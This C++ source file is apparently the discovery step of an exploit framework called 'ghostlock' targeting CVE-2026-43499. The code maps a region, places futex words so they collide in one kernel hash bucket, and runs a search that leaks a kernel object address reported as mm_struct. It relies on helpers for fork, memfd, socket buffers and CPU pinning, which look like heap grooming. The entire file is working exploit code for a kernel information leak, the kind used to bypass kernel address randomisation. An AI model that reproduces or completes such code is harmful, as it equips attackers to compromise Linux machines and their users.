/** @file backend/cve_2026_43499/steps/discovery_runner.cpp
 *  The discovery step, the device probe"s recipe. See the header.
 */
#include "backend/cve_2026_43499/steps/discovery_runner.hpp"

#include "backend/cve_2026_43499/leak/discovery_result.hpp"
#include "backend/cve_2026_43499/leak/snitch_discovery.hpp"

#include "backend/cve_2026_43499/leak/collision_buckets.hpp"
#include "backend/cve_2026_43499/leak/futex_hash.hpp"
#include "backend/cve_2026_43499/leak/snitch_seam_linux.hpp"
#include "backend/cve_2026_43499/memory/heap_seam_linux.hpp"
#include "backend/cve_2026_43499/leak/snitch_seam.hpp"
#include "backend/cve_2026_43499/leak/futex_hash.hpp"

namespace ghostlock::backend::cve_2026_43499::steps {
    namespace {
        /** 两个 seam 合起来用：搜索自己的映射/线程走 snitch seam，fork/memfd 等走 heap seam
         *  （与设备探针里那份 DeviceSeam 同一形状）。 */
        struct DeviceSeam final {
            static leak::MapResult map_shared(std::size_t bytes) noexcept { return leak::LinuxSnitchSeam::map_shared(bytes); }
            static memory::SeamResult unmap(void *address, std::size_t bytes) noexcept { return leak::LinuxSnitchSeam::unmap(address, bytes); }
            static memory::SeamResult futex_wait_private(std::uint32_t *word, std::uint32_t expected) noexcept {
                return leak::LinuxSnitchSeam::futex_wait_private(word, expected);
            }
            static memory::SeamResult futex_wait_private_until(std::uint32_t *word, std::uint32_t expected,
                                                              std::int64_t timeout_us) noexcept {
                return leak::LinuxSnitchSeam::futex_wait_private_until(word, expected, timeout_us);
            }
            static memory::SeamResult futex_wake_private(std::uint32_t *word, std::int32_t waiters) noexcept {
                return leak::LinuxSnitchSeam::futex_wake_private(word, waiters);
            }
            static leak::ThreadResult start_thread(leak::ThreadEntry entry, void *argument) noexcept {
                return leak::LinuxSnitchSeam::start_thread(entry, argument);
            }
            static memory::SeamResult join_thread(unsigned long handle) noexcept { return leak::LinuxSnitchSeam::join_thread(handle); }
            static memory::SeamResult page_size() noexcept { return memory::LinuxHeapSeam::page_size(); }
            static memory::SeamResult open_memfd(std::uint64_t pid) noexcept { return memory::LinuxHeapSeam::open_memfd(pid); }
            static memory::SeamResult close_fd(std::int32_t fd) noexcept { return memory::LinuxHeapSeam::close_fd(fd); }
            static memory::SeamResult socket_pair(std::int32_t *out) noexcept { return memory::LinuxHeapSeam::socket_pair(out); }
            static memory::SeamResult set_socket_buffer(std::int32_t fd, std::int32_t bytes) noexcept {
                return memory::LinuxHeapSeam::set_socket_buffer(fd, bytes);
            }
            static memory::SeamResult set_nonblocking(std::int32_t fd) noexcept { return memory::LinuxHeapSeam::set_nonblocking(fd); }
            static memory::SeamResult send_bytes(std::int32_t fd, const void *data,
                                                 std::size_t bytes) noexcept {
                return memory::LinuxHeapSeam::send_bytes(fd, data, bytes);
            }
            static memory::SeamResult send_buffer(std::int32_t fd, std::size_t bytes) noexcept {
                return memory::LinuxHeapSeam::send_buffer(fd, bytes);
            }
            static memory::SeamResult fork_child() noexcept { return memory::LinuxHeapSeam::fork_child(); }
            static memory::SeamResult stop_child(std::uint64_t pid) noexcept { return memory::LinuxHeapSeam::stop_child(pid); }
            static memory::SeamResult yield_now() noexcept { return memory::LinuxHeapSeam::yield_now(); }
            static memory::SeamResult pin_to_processor(std::int32_t cpu) noexcept { return memory::LinuxHeapSeam::pin_to_processor(cpu); }
            static void exit_child() noexcept { memory::LinuxHeapSeam::exit_child(); }
        };


        inline constexpr std::size_t kWordsBytes = 64U * 1024U;   /* 字要同桶：区大一点，搜索才有位置可用 */
        [[maybe_unused]] inline constexpr std::size_t kWordsStride = 64U;   /* 具名依据：字的步长 */
        inline constexpr const char *kWordsUnmapped = "discovery-words-unmapped";
        inline constexpr std::size_t kMaxCollisions = 64U;
    }  // namespace

    bool run_discovery(DiscoveryRequest &request, DiscoveryOutcome &out, const char **refusal) noexcept {
        if (request.setup.collisions == 0U || request.setup.collisions > kMaxCollisions) {
            *refusal = "discovery-collisions-bad";
            return false;
        }
        leak::CollisionBuckets buckets{};
        if (leak::futex_hash_context_init(&buckets.context, request.setup.futex_table_size) != 0) {
            *refusal = "discovery-hash-init-failed";
            return false;
        }
        /* mm 是键的一部分；私有 futex 上两侧一致即可，先用 0（两侧同值）*/
        buckets.mm = 0U;

        /* The words live in a region this process maps, one per collision: they are both the words
         *  the cohort hammers and the addresses the rule compares. */
        const auto words_region = DeviceSeam::map_shared(kWordsBytes);
        if (words_region.address == nullptr) {
            *refusal = kWordsUnmapped;
            return false;
        }
        auto *base = static_cast<unsigned char *>(words_region.address);
        std::uint32_t *word_ptrs[kMaxCollisions] = {};
        std::uint64_t addresses[kMaxCollisions] = {};
        const std::size_t count = request.setup.collisions;
        /* 字要**摆在同一个桶里**：规则要求候选与全部字同桶，而字的键含偏移 ⇒ 同一页里等距摆
         *  开的四个字各自落在不同桶（算下来命中率约 1/256^3，等于永不命中）。做法：在映射区里
         *  按**字**粒度找一个与第一个字同桶的地址，依次类推 —— 这是这套机制的真要求，不是调参。 */
        word_ptrs[0] = reinterpret_cast<std::uint32_t *>(base);
        addresses[0] = reinterpret_cast<std::uint64_t>(word_ptrs[0]);
        const std::uint64_t wanted = buckets.bucket_of(addresses[0]);
        std::size_t placed = 1U;
        for (std::size_t at = sizeof(std::uint32_t); at + sizeof(std::uint32_t) <= kWordsBytes && placed < count;
             at += sizeof(std::uint32_t)) {
            const std::uint64_t candidate_address = reinterpret_cast<std::uint64_t>(base + at);
            if (buckets.bucket_of(candidate_address) == wanted) {
                word_ptrs[placed] = reinterpret_cast<std::uint32_t *>(base + at);
                addresses[placed] = candidate_address;
                ++placed;
            }
        }
        if (placed < count) {
            *refusal = "discovery-no-colliding-words";
            return false;
        }

        const leak::RunOutcome outcome = leak::run_snitch_search<DeviceSeam>(
                request.setup, request.region, request.patience, request.counter_offset, word_ptrs,
                count, request.strides, request.range, request.sweep_tags, buckets, addresses, count);
        out.verdict = leak::run_verdict_name(outcome.status);
        out.found = outcome.found;
        /* The object, through the one mapping that turns a search answer into it: only a
         *  found address counts, and every other verdict is the mapping's own refusal. */
        leak::ObjectOutcome object_answer{};
        object_answer.status = outcome.status == leak::RunVerdict::Found
                                   ? leak::ObjectVerdict::Found
                                   : leak::ObjectVerdict::NotFound;
        object_answer.object = outcome.found;
        object_answer.probes = outcome.probes;
        out.mm_struct = leak::report_discovery(object_answer).mm_struct;
        out.probes = outcome.probes;
        out.rounds = outcome.rounds;
        out.pokes_wanted = outcome.pokes_wanted;
        out.error = outcome.error;
        return true;
    }
}  // namespace ghostlock::backend::cve_2026_43499::steps
